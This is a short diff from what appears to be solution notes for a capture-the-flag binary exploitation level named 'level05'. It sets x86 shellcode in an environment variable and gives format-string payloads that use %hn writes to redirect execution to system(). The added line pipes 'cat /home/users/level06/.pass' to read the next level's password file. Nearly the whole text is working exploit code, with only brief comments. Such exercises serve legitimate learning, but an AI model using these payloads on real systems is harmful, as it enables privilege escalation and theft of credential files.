@@ -27,5 +27,7 @@ export SHELLCODE=$(python -c 'print("\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\
 # Redirects to the system() function but then I need to make it execute /bin/sh
 ./level05 < <(python -c 'print("\xe0\x97\x04\x08" + "aaaa" + "\xe2\x97\x04\x08" + "%c" * 8 + "%44732c" + "%hn" + "%18710c" + "%hn")')
 
+env -i SHELLCODE=$SHELLCODE ./level05 < <(python -c 'print("\xe0\x97\x04\x08" + "aaaa" + "\xe2\x97\x04\x08" + "%c%c%c%c%c%c%c%c" + "%57280c" + "%hn" + "%8235c" + "%hn" + "cat /home/users/level06/.pass ;" * 200)')
+
 # env 0xffffe847
 # system 0xf7e6aed0
